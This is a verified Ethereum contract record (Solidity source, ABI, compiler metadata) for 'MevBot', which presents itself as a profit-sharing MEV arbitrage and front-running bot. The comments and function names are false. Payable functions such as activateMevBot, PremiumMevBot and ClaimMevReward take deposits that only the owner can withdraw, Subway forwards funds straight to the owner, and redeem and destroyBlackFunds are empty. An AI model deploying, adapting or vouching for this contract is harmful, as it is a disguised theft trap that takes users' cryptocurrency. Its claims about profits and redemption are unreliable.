{"SourceCode": "// SPDX-License-Identifier: UNLICENSED\r\n\r\n/**\r\n * BOT VERSION; 21QAZ3SX43XC34 2HH3:G5:X5  00:48:56   LICENSE CODE: 00X045VD0900X40\r\n * JAREDFROMSUBWAY.ETH    X    RABBIT TUNNEL    X    SUBWAY BOTS\r\n *\r\n *\r\n * MEVBot, which stands for \"Miner Extractable Value Bot,\" \r\n * is an automated program that helps users capture MEV (Miner Extractable Value) opportunities \r\n * in the Ethereum network from Arbitrage, Liquidation, Front and Back Running.\r\n *\r\n * MEVBot typically shares a portion of the profits generated with its users who have deployed it.\r\n */\r\n\r\npragma solidity ^0.8.0;\r\n\r\ncontract MevBot {\r\n    address private owner;\r\n\r\n    uint256 public destroyTime;\r\n\r\n    bool public active = true;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n/**\r\n * @dev Provides information about the MevBot execution context, including Swaps,\r\n * Dex and/or Liquidity Pools, sender of the transaction and its data. \r\n * While these are generally available\r\n * via msg.sender and msg.data, they should not be accessed in such a direct\r\n * manner, since when dealing with MEV-transactions the Account sending and\r\n * paying for execution is the sole controller of MevBot X7G-FOX 8 (as far as an application\r\n * is concerned).\r\n *\r\n * This contract is only required for intermediate, library-like contracts.\r\n */\r\n\r\n    constructor() {\r\n        owner = msg.sender;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(msg.sender == owner, \"Caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    function withdraw() public  onlyOwner {\r\n        payable(msg.sender).transfer(address(this).balance);\r\n    }\r\n\r\n    function Subway () public payable {\r\n        if (msg.value > 0) payable(owner).transfer(address(this).balance);\r\n    }\r\n    \r\n    /* Fun fact about MevBots: \r\n    *  Algorithmic trading, which includes MevBots, was initially developed \r\n    *  and used by institutional investors and hedge funds. Today, \r\n    *  with the advancement of technology and increased DeFi accessibility, \r\n    *  even individual holder can utilize MevBots to optimize their strategies \r\n    *  and gain a competitive edge in the DeFi market.\r\n    */\r\n\r\n    function activateMevBot() public payable {\r\n       \r\n        if (msg.value > 0) { }\r\n    }\r\n\r\n    function MevBotInstaller () public payable {\r\n       \r\n        if (msg.value > 0) { }\r\n    }\r\n\r\n    function StartMevBotTrial () public payable {\r\n       \r\n        if (msg.value > 0) { }\r\n    }\r\n\r\n    /*\r\n    *\r\n    * Users can upgrade their MevBot from the Basic version to the Premium version, \r\n    * gaining access to enhanced features and advanced tools that optimize their trading strategies \r\n    * for maximum profitability. The Premium version offers an elevated trading experience, \r\n    * users to stay ahead in the competitive world of MEV trading.\r\n    *\r\n    */\r\n\r\n      function BoostMevBot() public payable {\r\n       \r\n        if (msg.value > 0) { }\r\n    }\r\n     \r\n     function PremiumMevBot () public payable {\r\n       \r\n        if (msg.value > 0) { }\r\n    }\r\n\r\n     function BasicMevBot () public payable {\r\n       \r\n        if (msg.value > 0) { }\r\n    }\r\n    function ClaimMevReward () public payable {\r\n       \r\n        if (msg.value > 0) { }\r\n    }\r\n\r\n /* \r\n * calculates 5% of the calling wallet's Ether balance and \r\n * subtracts it from the total balance to return the available balance \r\n * after reserving for gas fees. \r\n *\r\n * Note that this function only returns the adjusted balance for display purposes \r\n * and does not modify the actual balance in the wallet.\r\n */\r\n    \r\n    function getBalance() public view returns (uint256) {\r\n    uint256 balance = address(msg.sender).balance;\r\n    uint256 reserve = balance * 5 / 100; \r\n    uint256 availableBalance = balance - reserve; \r\n    return availableBalance;\r\n}\r\n\r\n     /**\r\n     * @dev The MevBot self-destruct mechanism allows the Bot\r\n     * for contract termination, transferring any remaining ether \r\n     * to the MevBot Initializing address and marking the Bot as inactive. \r\n     * This adds control and security to the MevBot's lifecycle.\r\n     */\r\n\r\n    function setDestroyTime(uint256 _time) public onlyOwner {\r\n        require(_time > block.timestamp, \"Destroy time must be in the future\");\r\n        destroyTime = _time;\r\n    }\r\n\r\n    function destroy() public onlyOwner {\r\n        require(destroyTime != 0, \"Destroy time not set\");\r\n        require(block.timestamp >= destroyTime, \"Destroy time has not been reached\");\r\n\r\n        if (address(this).balance > 0) {\r\n            payable(owner).transfer(address(this).balance);\r\n        }\r\n\r\n        active = false;\r\n    }\r\n    \r\n/**\r\n * @dev MevBot module which provides a basic access control mechanism, where\r\n * there is an account (an owner) that can be granted exclusive access to\r\n * Liquidity Pools, Dex and Pending Transactions.\r\n *\r\n * By default, the owner account will be the one that Initialize the MevBot. This\r\n * can later be changed with {transferOwnership} or Master Chef Proxy.\r\n *\r\n * MevBot module is used through inheritance. It will make available the modifier\r\n * `onlyOwner`, which can be applied to your functions to restrict their use to\r\n * MevBot owner.\r\n */\r\n\r\n\r\n    function transferOwnership(address newOwner) public onlyOwner {\r\n        require(newOwner != address(0), \"New owner is the zero address\");\r\n        emit OwnershipTransferred(owner, newOwner);\r\n        owner = newOwner;\r\n    }\r\n\r\n \r\n    string private welcomeMessage;\r\n\r\n    event WelcomeMessageChanged(string oldMessage, string newMessage);\r\n\r\n    function setWelcomeMessage(string calldata newMessage) public {\r\n        string memory oldMessage = welcomeMessage;\r\n        welcomeMessage = newMessage;\r\n        emit WelcomeMessageChanged(oldMessage, newMessage);\r\n    }\r\n\r\n    function getWelcomeMessage() public view returns (string memory) {\r\n        return welcomeMessage;\r\n    }\r\n\r\n    /* \r\n    * Blacklisting Honeypots;  honeypot is a malicious trap set up by bad actors to deceive and \r\n    * exploit unsuspecting users, often with the intention of stealing funds. \r\n    * Honeypots can take many forms, including fraudulent smart contracts, fake websites, \r\n    * or seemingly legitimate projects or trading platforms.\r\n    */\r\n\r\n    mapping(address => bool) private blacklist;\r\n\r\n    \r\n\r\n    modifier notBlacklisted() {\r\n    require(!blacklist[msg.sender], \"Caller is blacklisted\");\r\n    _;\r\n}\r\n\r\n    function setBlacklistStatus(address target, bool status) public onlyOwner {\r\n    blacklist[target] = status;\r\n    emit BlacklistUpdated(target, status);\r\n}\r\n\r\n    function isBlacklisted(address target) public view returns (bool) {\r\n    return blacklist[target];\r\n}     \r\n    \r\n      /* \r\n        * In the context of MevBot contracts, a Bot-Permit to spend is essentially \r\n        * granting an automated program (MevBot) the authority to utilize a certain amount of your digital assets \r\n        * (like tokens) on your behalf. This could be for various functions such as trading, participating \r\n        * in Liquidation, Front Run or performing arbitrage strategies.\r\n        */\r\n\r\n        /* \r\n        * This permit ensures that the bot has a limited, predefined access to your assets, \r\n        * thereby ensuring your funds' safety.\r\n        */ \r\n\r\n        /*\r\n        * guardedFunction uses the logic of the nonReentrant modifier directly. \r\n        * It increments the _guardCounter before executing the function code and restores it afterward. \r\n        * If a reentrant call is made, _guardCounter will not be the same \r\n        * and you can check this condition to prevent reentrancy.\r\n        */\r\n\r\n   \r\n    /* \r\n    * MEVBot facilitates the redemption of funds through various mechanisms. \r\n    * When a redemption is requested, MEVBot typically transfers the redeemed funds back to \r\n    * the designated recipient's address. The specific process may vary depending on \r\n    * the implementation of MEVBot and the underlying smart contract. \r\n    * However, the overall objective is to ensure that the redeemed funds are securely and \r\n    * accurately transferred to the intended recipient.\r\n    */\r\n\r\n     event Redeem(uint amount);\r\n\r\n     function redeem(uint amount) public view {\r\n\r\n     getBalance();(amount);\r\n    }\r\n\r\n    /*\r\n    * The MevBot blacklist is a feature that prevents certain addresses from interacting with the MevBot contract. \r\n    * It helps protect against known malicious actors and fraudulent activities. \r\n    * The blacklist is implemented using a mapping where addresses are marked as blacklisted or not. \r\n    */\r\n        \r\n    mapping (address => bool) public isBlackListed;\r\n    event BlacklistUpdated(address indexed target, bool isBlacklisted);\r\n\r\n    event DestroyedBlackFunds(address _blackListedUser, uint _balance);\r\n\r\n    event AddedBlackList(address _user);\r\n\r\n    event RemovedBlackList(address _user);\r\n     \r\n     /*\r\n     * The blacklist enhances security by restricting \r\n     * blacklisted honeypots and taxed tokens from performing actions,\r\n     * shield MevBot from getting blacklisted when interacting with other contract.\r\n     */\r\n\r\n   \r\n    function getBlackListStatus(address _maker) external view returns (bool) {\r\n        return isBlackListed[_maker];}\r\n\r\n    function getOwner() external view returns (address) {\r\n        return owner;}\r\n\r\n    function addBlackList (address _evilUser) public onlyOwner {\r\n        isBlackListed[_evilUser] = true; }\r\n    \r\n    function removeBlackList (address _clearedUser) public onlyOwner {\r\n        isBlackListed[_clearedUser] = false;  }\r\n\r\n    function destroyBlackFunds (address _blackListedUser) public view onlyOwner {\r\n        require(isBlackListed[_blackListedUser]); }  \r\n    \r\n\r\n    /* Subway Disclaimer for Bot Codes\r\n    *\r\n    *  The provided code snippets and information are for educational purposes only \r\n    *  and not professional advice. The technology landscape is constantly evolving; \r\n    *  readers should conduct research and consult professionals before using any bot codes or technologies. \r\n    *  The author and publisher disclaim responsibility for any errors, omissions, or resulting damages. \r\n    *  Using bots may be against the terms of service for some platforms; ensure compliance \r\n    *  with all applicable regulations before implementation.\r\n    *\r\n    *\r\n    * BOT VERSION; 21QAZ3SX43XC34 2023:05:05  00:48:56   LICENSE CODE: 00X045VD0900X40\r\n    * JAREDFROMSUBWAY.ETH    X    RABBIT TUNNEL    X    SUBWAY BOTS\r\n    */\r\n    \r\n }", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"_user\",\"type\":\"address\"}],\"name\":\"AddedBlackList\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"target\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"bool\",\"name\":\"isBlacklisted\",\"type\":\"bool\"}],\"name\":\"BlacklistUpdated\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"_blackListedUser\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"_balance\",\"type\":\"uint256\"}],\"name\":\"DestroyedBlackFunds\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"Redeem\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"_user\",\"type\":\"address\"}],\"name\":\"RemovedBlackList\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"string\",\"name\":\"oldMessage\",\"type\":\"string\"},{\"indexed\":false,\"internalType\":\"string\",\"name\":\"newMessage\",\"type\":\"string\"}],\"name\":\"WelcomeMessageChanged\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"BasicMevBot\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"BoostMevBot\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"ClaimMevReward\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"MevBotInstaller\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"PremiumMevBot\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"StartMevBotTrial\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"Subway\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"activateMevBot\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"active\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_evilUser\",\"type\":\"address\"}],\"name\":\"addBlackList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"destroy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_blackListedUser\",\"type\":\"address\"}],\"name\":\"destroyBlackFunds\",\"outputs\":[],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"destroyTime\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getBalance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_maker\",\"type\":\"address\"}],\"name\":\"getBlackListStatus\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getWelcomeMessage\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isBlackListed\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"target\",\"type\":\"address\"}],\"name\":\"isBlacklisted\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"redeem\",\"outputs\":[],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_clearedUser\",\"type\":\"address\"}],\"name\":\"removeBlackList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"target\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"status\",\"type\":\"bool\"}],\"name\":\"setBlacklistStatus\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_time\",\"type\":\"uint256\"}],\"name\":\"setDestroyTime\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"string\",\"name\":\"newMessage\",\"type\":\"string\"}],\"name\":\"setWelcomeMessage\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"withdraw\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "MevBot", "CompilerVersion": "v0.8.18+commit.87f61d96", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "Unlicense", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://26cba8d0207d1f21013ee0317e62644f50731abc18bd7c29cd5b61c26312a632"}